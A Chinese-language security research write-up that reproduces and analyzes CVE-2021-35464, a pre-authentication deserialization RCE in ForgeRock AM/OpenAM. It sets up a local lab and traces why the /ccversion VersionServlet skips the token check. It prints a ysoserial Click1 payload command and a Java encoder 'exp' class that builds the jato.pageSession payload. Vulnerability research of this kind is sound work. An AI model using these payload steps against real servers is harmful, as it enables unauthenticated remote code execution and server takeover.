# 环境搭建

**漏洞影响范围: **

- `Forge Rock >= 5.0.0 < 6.5.3`
- `Forge Rock OpenAM >= 9.0.0 < 14.6.3`

**漏洞描述:**

> ForgeRock AM是一个开源的访问管理、权限控制平台。2021年6月29日，国外安全研究人员披露CVE-2021-35464 ForgeRock AM远程代码执行漏洞。攻击者可在无需认证的情况下，通过构造特殊的请求，触发反序列化，从而执行任意代码，接管运行ForgeRock AM服务器。阿里云应急响应中心提醒 ForgeRock AM 用户尽快采取安全措施阻止漏洞攻击。
>
> ###### 解决建议
>
> 1、升级 ForgeRock AM 至最新版本
>
> 2、注释 AMweb.xml 文件中的以下部分来禁止VersionServlet的映射，防止攻击者访问相关路径。
>
> 
> VersionServlet
> /ccversion/*
>
>
> 3、配合反向代理（如Nginx）等其他方法禁止向ccversion发起请求。



官网下载https://github.com/OpenIdentityPlatform/OpenAM，用tomcat搭建

在hosts文件添加一条

```
127.0.0.1   openam.example.com
```

复现环境：tomcat8，jdk11，macos，openam14.6.2

![image-20230710184906767](images/1.png)

也可以用docker远程调试

```
docker pull openidentityplatform/openam:14.6.2

docker pull openidentityplatform/opendj:latest
```

![image-20230710163007754](images/2.png)

```
docker run  -d -p 7080:8080 -p 5005:5005 --name openam openidentityplatform/openam:14.6.2
echo "127.0.0.1 localhost openam.example.com example.com">>/etc/hosts
拷贝openam.war
docker cp openam://usr/local/tomcat/webapps/openam.war ./
```

在catalina.sh中添加如下代码：
`CATALINA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,suspend=n,server=y"`

```
也可以vim /opt/atlassian/confluence/bin/setenv.sh

# 在 export CATALINA_OPTS 这一行上面加上如下一行：

CATALINA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 ${CATALINA_OPTS}"
```

# 漏洞复现

采用Click1这条链子

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Click1 "open -a Calculator" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '='
```

![image-20230710194939817](images/3.png)

![image-20230710194926377](images/4.png)



![image-20230710194910552](images/5.png)

或者直接把原始的yso生成的内容用Encoder.encodeHttp64加密

# 漏洞分析

## 漏洞点

通过复现我们找到了漏洞点在com.iplanet.jato.util.Encoder的deserialize方法

![image-20230711135151512](images/6.png)

是通过ViewBeanBase的deserializePageAttributes方法调用过来的

![image-20230711135245583](images/7.png)

## 路由解析

那么具体是怎么调用到这里来的呢，从整体的项目可以看到，这是一个Tomcat项目，而它的servlet在web.xml中进行了配置，我们随便选择一个servlet可以发现，其实它并没有直接继承HttpServlet

![image-20230711140109031](images/8.png)

比如说TaskServlet继承了ConsoleServletBase，并且，没有实现自己的doGet和doPost方法

![image-20230711140203161](images/9.png)

而ConsoleServletBase也是，是继承自ApplicationServletBase

![image-20230711140232551](images/10.png)

这个ApplicationServletBase才继承了HttpServlet，并且实现了doGet和doPost方法

![image-20230711140312118](images/11.png)

我查看了多个servlet，都是一样的实现，那么就可以知道，整个项目对于get和post的处理都在ApplicationServletBase所实现的doGet和doPost方法，然后由processRequest来进行对请求的处理

```
protected void processRequest(String pageName, HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    RequestContext requestContext = null;

    try {
        request.setAttribute("jato.handlingServlet", this);
        requestContext = this.createRequestContext(request, response);
        request.setAttribute("jato.requestContext", requestContext);
        this.initializeRequestContext(requestContext);
        if (this.isShowMessageBuffer()) {
            request.setAttribute("jato.showMessages", new Boolean(true));
        }

        RequestManager.setRequestContext(requestContext);
        this.fireBeforeRequestEvent(requestContext);
        this.addResponseHeaders(requestContext);
        if (pageName == null) {
            pageName = this.getDefaultHandlerName(request);
            if (pageName == null) {
                this.fireRequestHandlerNotSpecifiedEvent(requestContext);
            }
        }

        this.fireSessionEvents(requestContext);
        ViewBean viewBean = this.getViewBeanInstance(pageName, requestContext);

        try {
            this.dispatchRequest(viewBean, requestContext);
        } catch (NavigationException var12) {
            if (var12.getRootCause() instanceof IOException) {
                throw (IOException)var12.getRootCause();
            }

            if (var12.getRootCause() instanceof ServletException) {
                throw (ServletException)var12.getRootCause();
            }

            throw var12;
        }
    } catch (CompleteRequestException var13) {
    } catch (Exception var14) {
        Log.log(64, "Uncaught application exception", var14);
        this.fireUncaughtException(requestContext, var14);
    } finally {
        this.notifyRequestCompletionListeners(requestContext);
        this.fireAfterRequestEvent(requestContext);
    }

}
```

再通过dispatchRequest来分发请求到对于的类

## 权限校验

在了解了对请求的处理后，来观察一下权限认证，毕竟不需要登陆的漏洞利用起来才是最简单的

前面说了所有的请求都会在processRequest方法进行处理，那么权限认证也不例外

![image-20230711140841022](images/12.png)

在处理请求的时候调用了fireBeforeRequestEvent，然后就addResponseHeaders，跟进fireBeforeRequestEvent看看

![image-20230711140857251](images/13.png)

![image-20230711143850035](images/14.png)

最终调用了子类的onBeforeRequest（这里不能用payload打断点进来，因为payload是绕过了这里的），这个方法通过校验token是否合法来进行权限验证

![image-20230711143633889](images/15.png)

我们发现，一共有两个子类实现了onBeforeRequest方法，现在来看一个特殊的Servlet（VersionServlet），查看所有的servlet找到了这一个，它的继承关系为`VersionServlet——com.sun.web.ui.servlet.version.VersionServlet——TagsServletBase——ApplicationServletBase`，很巧的看到了这整条继承链下来，没有一个类实现了onBeforeRequest，那么在ApplicationServletBase调用onBeforeRequest方法的时候就是为空的，没有这个方法，自然就绕过了权限认证

## 动态分发

前面提到了在processRequest中用dispatchRequest进行了分发，具体怎么分发的呢

![image-20230711145212793](images/16.png)

pageName是截取我们url最后的字符串得到的，然后通过getViewBeanInstance获取到pageName对应的Bean实例，接下来用dispathRequest方法来分发，分发时执行函数forwardTo，

![image-20230711145154490](images/17.png)

具体生产viewBean的代码就不详细写了，大概的思路就是，获取当前的viewBeanManager，再得到对应包名下单*ViewBean，这里就是VersionViewBean，其实这个才是每分servlet下对应的路由，才能访问到具体的内容，接下来再dispatchRequest中调用forwardTo分发

## 漏洞链

其实这次的漏洞还没有到forwardTo，在dispatchRequest到if判断中触发了，调用了viewBean的invokeRequestHandler

![image-20230711150332534](images/18.png)

所有的viewBean都继承了ViewBeanBase，而对于ccversion路由，并没有继承AMViewBeanBase和ConsoleViewBeanBase，这个方法在ViewBeanBase中实现，接下来调用deserializePageAttributes

this是VersionViewBean，并没有实现这个方法所以调用父类ViewBeanBase的deserializePageAttributes（注意这里看清楚是哪一个VersionViewBean，这里/ccversion路由下的VersionViewBean）

![image-20230711151841729](images/19.png)

![image-20230711150511865](images/20.png)

会对jato.pageSession参数进行decodeHttp64解码后调用Encoder的deserialize

![image-20230711150605717](images/21.png)

没有限制，直接反序列化，对于项目中的jar包，看到Commons-Collections的版本并没有对应的链子，不过发现了click-nodeps-2.3.0，刚好是Click1这条链

![image-20230711150902898](images/22.png)

其实可以发现

exp

```
package com.test;

import com.iplanet.jato.util.Encoder;
import java.util.Base64;

public class Main {

    public static void main(String[] args) {
        String base = "yso生成的base64字符串";
        String s = Encoder.encodeHttp64(Base64.getDecoder().decode(base), 10000000);
        System.out.println(s);
    }
}
```

也可以直接用命令行

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Click1 "open -a Calculator" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '='
```

# 写在最后

这次的分析很有收获，不仅是单纯的跟进整条链子，而是从一个漏洞挖掘者和安全研究的方向入手，怎么去发现的，怎么去分析的，怎么从payload倒过去找到整个人利用思路





参考链接：

https://www.anquanke.com/post/id/246660

[ForgeRock OpenAM CVE-2021-35464漏洞分析 (exp1orer.github.io)](https://exp1orer.github.io/2021/10/01/ForgeRock-OpenAM-CVE-2021-35464漏洞分析/)

https://www.anquanke.com/post/id/247357#h2-5

